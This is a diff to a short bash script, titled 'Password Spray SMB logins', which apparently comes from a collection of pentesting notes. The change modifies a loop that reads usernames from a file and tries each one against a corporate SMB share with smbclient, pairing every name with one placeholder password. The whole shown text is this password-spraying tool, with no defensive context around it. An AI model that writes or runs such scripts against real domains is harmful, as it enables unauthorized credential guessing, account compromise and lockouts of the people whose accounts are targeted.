@@ -6,9 +6,12 @@ Password Spray SMB logins
 
 ####### BEGIN SCRIPT ############
 #!/bin/bash
-while read users; do
-  smbclient \\\\server.corp.domain.name.org\\sharename -U DOMAIN/\$users%passwordgoeshere
-done <usernames.txt
+usernames=$1
+while read u; do
+#echo $u 
+#echo 'CORP\'$u'%passwordgoeshere'
+smbclient \\\\server.corp.domain.name.com\\sharename -U 'DOMAIN-NAME\'$u'%passwordgoeshere'
+done < "$usernames"
 ####### END SCRIPT ##############
 
 # List of usernames
